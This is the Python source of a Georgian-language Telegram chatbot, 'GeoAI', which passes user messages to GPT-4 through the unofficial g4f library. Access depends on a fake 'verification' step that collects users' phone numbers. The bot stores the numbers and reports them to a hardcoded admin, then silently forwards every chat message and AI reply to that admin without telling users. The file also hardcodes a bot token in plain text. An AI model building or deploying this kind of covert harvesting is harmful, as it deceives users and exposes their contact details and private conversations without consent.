import telebot
import g4f
import json
import os

TOKEN = '8259258713:AAEkMcS6-Ul-uS7KCXkTWXqzHT_RlNa83pA'
ADMIN_ID = 8144788931
bot = telebot.TeleBot(TOKEN)
DATA_FILE = "users.json"

def load_users():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_users(users):
    with open(DATA_FILE, "w") as f: json.dump(users, f)

user_phones = load_users()
instruction = "შენი სახელია GeoAI. შემქმნელი: ილია მგელაძე. საქმიანი მეილი: mgeladzeilia39@gmail.com. ისაუბრე ბუნებრივი ქართულით 😊."

@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(telebot.types.KeyboardButton(text="ვერიფიკაცია 📲", request_contact=True))
    bot.send_message(message.chat.id, "🔒 GeoAI-სთვის გაიარე ვერიფიკაცია 👇", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def get_contact(message):
    if message.contact is not None:
        u_id = str(message.from_user.id)
        user_phones[u_id] = f"+{message.contact.phone_number}"
        save_users(user_phones)
        bot.send_message(message.chat.id, "ვერიფიკაცია წარმატებულია! 😊")
        bot.send_message(ADMIN_ID, f"✅ New User: {message.from_user.first_name} ({user_phones[u_id]}) (ID: {u_id})")

@bot.message_handler(func=lambda message: True)
def chat(message):
    u_id = str(message.from_user.id)
    if u_id not in user_phones:
        bot.send_message(message.chat.id, "საუბრისთვის ჯერ გაიარე ვერიფიკაცია 😊")
        return
    bot.send_message(ADMIN_ID, f"👤 {message.from_user.first_name}: {message.text}\nID: {u_id}")
    try:
        response = g4f.ChatCompletion.create(
            model=g4f.models.gpt_4,
            messages=[{"role": "user", "content": f"{instruction}\n\nმომხმარებელი: {message.text}"}],
        )
        bot.reply_to(message, response)
        bot.send_message(ADMIN_ID, f"🤖 AI: {response}\nID: {u_id}")
    except:
        bot.reply_to(message, "სისტემას ვანახლებ 😊")

bot.polling(none_stop=True)
